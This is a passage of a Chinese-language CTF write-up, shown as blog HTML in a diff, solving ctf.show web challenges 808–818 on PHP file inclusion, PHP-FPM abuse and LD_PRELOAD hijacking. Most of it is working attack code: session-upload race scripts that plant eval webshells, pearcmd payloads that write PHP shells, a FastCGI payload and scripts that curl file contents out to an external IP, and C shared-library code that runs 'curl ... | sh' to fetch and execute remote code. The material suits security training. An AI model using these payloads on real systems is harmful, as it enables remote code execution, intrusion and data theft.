class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>核心是<code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code>会让php的线程崩溃</p>
+<h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>包含session</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://13d3ac5b-6c38-41c9-9364-ada319d284d3.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&#x27;http://13d3ac5b-6c38-41c9-9364-ada319d284d3.challenge.ctf.show/?file=/tmp/sess_flag&#x27;</span></span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;echo 11123;system(&quot;cat /f*&quot;);&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url2,data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;11123&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="web809-pear文件包含-x2F-RCE"><a href="#web809-pear文件包含-x2F-RCE" class="headerlink" title="web809 pear文件包含&#x2F;RCE"></a>web809 pear文件包含&#x2F;RCE</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($file) &amp;&amp; !preg_match(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>,$file))&#123;</span><br><span class="line">    include $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    <span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;info&#x27;</span>]))&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看p牛的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=system(<span class="string">&#x27;cat /f*&#x27;</span>);?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/?&gt;&lt;?=<span class="built_in">eval</span>($_POST[<span class="number">1</span>]);?&gt;+/tmp/<span class="number">1.</span>txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: e38c9852-ecd9-442b-984d-3b773381fc5a.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">101.0</span><span class="number">.4951</span><span class="number">.54</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<h1 id="web810-SSRF打PHP-FPM"><a href="#web810-SSRF打PHP-FPM" class="headerlink" title="web810 SSRF打PHP-FPM"></a>web810 <strong>SSRF打PHP-FPM</strong></h1><p>用gopherus生成payload打就行</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510203847-ce3wt2b.png" alt="image.png"></p>
+<p>后面的%00需要url编码</p>
+<h1 id="web811-file-put-contents打PHP-FPM"><a href="#web811-file-put-contents打PHP-FPM" class="headerlink" title="web811 file_put_contents打PHP-FPM"></a>web811 file_put_contents打PHP-FPM</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以通过搭建恶意ftp服务器攻击9000端口的php-fpm</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=ftp://aaa@<span class="number">1.117</span><span class="number">.144</span><span class="number">.41</span>:<span class="number">23</span>/<span class="number">123</span>&amp;content=%01%01%<span class="number">00</span>%01%<span class="number">00</span>%08%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%<span class="number">00</span>%F6%06%<span class="number">00</span>%0F%10SERVER_SOFTWAREgo%<span class="number">20</span>/%20fcgiclient%<span class="number">20</span>%0B%09REMOTE_ADDR127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%0F%08SERVER_PROTOCOLHTTP/<span class="number">1.1</span>%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%<span class="number">20</span>%3D%20On%0Adisable_functions%<span class="number">20</span>%3D%<span class="number">20</span>%0Aauto_prepend_file%<span class="number">20</span>%3D%20php%3A//<span class="built_in">input</span>%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%05%<span class="number">00</span>%01%<span class="number">00</span>%5C%04%<span class="number">00</span>%3C%3Fphp%20system%<span class="number">28</span>%27curl%20http%3A//<span class="number">1.117</span><span class="number">.144</span><span class="number">.41</span>%3A4444/%60cat%<span class="number">20</span>/f%2A%<span class="number">60</span>/%<span class="number">27</span>%<span class="number">29</span>%3Bdie%<span class="number">28</span>%<span class="number">27</span>-----Made-by-SpyD3r-----%0A%<span class="number">27</span>%<span class="number">29</span>%3B%3F%3E%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+
+<p>开恶意ftp服务器然后打就行</p>
+<h1 id="web812-PHP-FPM未授权"><a href="#web812-PHP-FPM未授权" class="headerlink" title="web812 PHP-FPM未授权"></a>web812 PHP-FPM未授权</h1><p><a target="_blank" rel="noopener" href="https://github.com/wuyunfeng/Python-FastCGI-Client">https://github.com/wuyunfeng/Python-FastCGI-Client</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py -c <span class="string">&#x27;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#x27;</span> -p <span class="number">28026</span> pwn.challenge.ctf.show /usr/local/lib/php/System.php</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web813-劫持mysqli-so"><a href="#web813-劫持mysqli-so" class="headerlink" title="web813 劫持mysqli.so"></a>web813 劫持mysqli.so</h1><p>同样是开了FASTCGI，但是这道题本意让我们用恶意so拓展打</p>
+<p>题目满足条件：</p>
+<ol>
+<li>extension目录已知且可写</li>
+<li>命令行或fpm能够加载恶意拓展文件</li>
+<li>有调用自定义函数</li>
+</ol>
+<p>所以主要是考察编写php的拓展so文件从而达到劫持</p>
+<p>这里用ext_skel框架开发扩展</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/releases/">https://www.php.net/releases/</a>下载相应版本源码包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php ext_skel.php --ext ctfshow --std</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515204421-9sozwed.png" alt="image.png"></p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515204451-vsvl7sn.png" alt="image.png"></p>
+<p>然后编译</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure --with-php-config=/www/server/php/<span class="number">73</span>/bin/php-config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>接着把生成的恶意so文件传到目标服务器的extension目录即可</p>
+<p>这里自己尝试的时候的坑：</p>
+<ol>
+<li>如果用例如宝塔安装的php，要指定他的php-config文件</li>
+<li>php-config要和你下载源码，也就是想重写的so文件的php版本一样，否则不能成功</li>
+<li>一定要让目标重新把我们恶意的so扩展加载之后才能打</li>
+</ol>
+<h1 id="web814-LD-PRELOAD"><a href="#web814-LD-PRELOAD" class="headerlink" title="web814 LD_PRELOAD"></a>web814 LD_PRELOAD</h1><p>getuid</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">payload</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl https://your-shell.com/1.117.144.41:4444 | sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">getuid</span>()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="title function_ invoke__">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC poc.c -o hack&amp;&amp;gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web815-劫持构造器"><a href="#web815-劫持构造器" class="headerlink" title="web815 劫持构造器"></a>web815 <strong>劫持构造器</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE </span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt; </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt; </span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt; </span></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span> ((__constructor__)) <span class="keyword">void</span> <span class="title function_ invoke__">preload</span> (<span class="keyword">void</span>) </span><br><span class="line">&#123; </span><br><span class="line">	<span class="title function_ invoke__">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;curl https://your-shell.com/1.117.144.41:4444 | sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web816-临时文件利用"><a href="#web816-临时文件利用" class="headerlink" title="web816 临时文件利用"></a>web816 <strong>临时文件利用</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="variable">$env</span>.<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>)[<span class="number">2</span>]);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo ctfshow&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>往tmp目录下面传临时文件，把LD_PRELOAD指向临时文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://da7e9cb2-9fd2-4b66-a4d3-a46b3927d67f.challenge.ctf.show/?env=LD_PRELOAD=/tmp/&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure>
+
+<h1 id="web817-nginx缓存临时文件"><a href="#web817-nginx缓存临时文件" class="headerlink" title="web817 nginx缓存临时文件"></a>web817 nginx缓存临时文件</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\/(\w+\/?)+$/&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">shell_exec</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat <span class="subst">$file</span>&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于我是先做的818，所以这里是818之后，仿照羽师傅的脚本自己写的，思路也就是nginx缓存，然后去包含&#x2F;proc&#x2F;fid&#x2F;fd&#x2F;{fd}下的文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">port = <span class="number">28144</span></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">rev=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&quot;(.*?)www-data&quot;</span>,rev)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line"></span><br><span class="line">con = <span class="string">&quot;curl http://1.117.144.41:4444/`cat /*`;&quot;</span> + <span class="string">&quot;5&quot;</span> * <span class="number">1024</span> * <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s = socket.socket()</span><br><span class="line">		s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">		l = <span class="built_in">len</span>(con)</span><br><span class="line">		x = <span class="string">f&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;l&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;con&#125;</span>&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line">		s.send(x)</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruter</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line">			<span class="built_in">print</span>(fd)</span><br><span class="line">			s=socket.socket()</span><br><span class="line">			s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">			s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?file=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: fuckyou</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">			<span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">			s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	t = threading.Thread(target=upload)</span><br><span class="line">	t.start()</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	a = threading.Thread(target=bruter)</span><br><span class="line">	a.start()</span><br></pre></td></tr></table></figure>
+
+<h1 id="web818-nginx-body缓存写入临时文件"><a href="#web818-nginx-body缓存写入临时文件" class="headerlink" title="web818 nginx body缓存写入临时文件"></a>web818 nginx body缓存写入临时文件</h1><p>原理略，整理在另一篇笔记</p>
+<p>直接学习羽师傅脚本即可，他这里是用socket库来进行网络请求的。</p>
+<p>关键点是31行的恶意字节填充，让hack.so的文件内容写入nginx产生的临时文件</p>
+<p>接着用bruter函数对proc目录进行一个爆破即可，这里的pid题目中会给到，所以只用爆破后面的fd即可</p>
+<p>羽师傅的脚本真的清晰，学习了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">port= <span class="number">28118</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line">l=<span class="built_in">str</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>)).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s=socket.socket()</span><br><span class="line">		s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">		x=<span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Content-Length: &#x27;&#x27;&#x27;</span>+l+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">		s.send(x)</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruter</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line">			<span class="built_in">print</span>(fd)</span><br><span class="line">			s=socket.socket()</span><br><span class="line">			s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">			s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Connection: 